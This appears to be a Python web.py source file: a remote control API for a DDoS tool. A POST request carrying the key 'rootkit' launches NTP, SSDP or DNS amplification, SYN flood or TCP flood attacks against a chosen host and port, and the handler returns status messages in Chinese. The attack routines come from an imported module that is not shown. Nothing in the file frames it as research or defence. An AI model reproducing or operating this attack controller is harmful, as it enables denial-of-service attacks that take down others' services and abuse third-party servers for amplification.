#!/usr/bin/env python
#-*- encoding: utf-8 -*-
'''
Created on 2017-07-07 11:54:51

@author: vforbox <vforbox@gmail.com>
'''

from lib import web
from lib.ddos import DDoSAttack

key     = ['rootkit']
method  = ['ntp', 'ssdp', 'dns', 'syn', 'tcp']
allow   = ['127.0.0.1']

class ApiHandler(object):
	def GET(self):
		return 'Fuck.'

	def POST(self):
		if web.ctx.get('ip') not in allow:
		    return 'deny'

		data = web.input()
		(host, port, time, thread, met, keys, stop) = '', 80, 50, 50, 'ntp', '', '0'

		if data.get('method'):
			met = data.get('method')
		if data.get('host'):
			host = data.get('host')
		if data.get('port'):
			port = data.get('port')
		if data.get('time'):
			time = data.get('time')
		if data.get('thread'):
			thread = data.get('thread')
		if data.get('key'):
			keys = data.get('key')
		if data.get('stop'):
			stop = data.get('stop')
		if host == '':
			return 'Host is empyt.'
		if keys not in key or keys == '':
			return 'Key Error.'
		if stop != '0' and stop != '1':
			return 'Stop Parameter error.'

		ddos = DDoSAttack(host, port, time)

		if stop == '1':
			if ddos.stop():
				return '停止任务完成.'
			else:
				return '停止任务失败.'

		if met in method:
			if met == 'ntp':
				if ddos.ntp(thread):
					return 'NTP 模式 - 攻击目标IP [{0}] 完成.'.format(host)
				else:
					return 'NTP 模式 - 攻击目标IP [{0}] 失败或被停止.'.format(host)
			elif met == 'ssdp':
				if ddos.ssdp(thread):
					return 'SSDP 模式 - 攻击目标IP [{0}] 完成.'.format(host)
				else:
					return 'SSDP 模式 - 攻击目标IP [{0}] 失败或被停止.'.format(host)
			elif met == 'dns':
				if ddos.dns(thread):
					return 'DNS 模式 - 攻击目标IP [{0}] 完成.'.format(host)
				else:
					return 'DNS 模式 - 攻击目标IP [{0}] 失败或被停止.'.format(host)
			elif met == 'syn':
				if ddos.syn(thread):
					return 'SYN 模式 - 攻击目标IP [{0}] 完成.'.format(host)
				else:
					return 'SYN 模式 - 攻击目标IP [{0}] 失败或被停止.'.format(host)
			elif met == 'tcp':
				if ddos.tcp(thread):
					return 'TCP 模式 - 攻击目标IP [{0}] 完成.'.format(host)
				else:
					return 'TCP 模式 - 攻击目标IP [{0}] 失败或被停止.'.format(host)
		return 'Fuck.'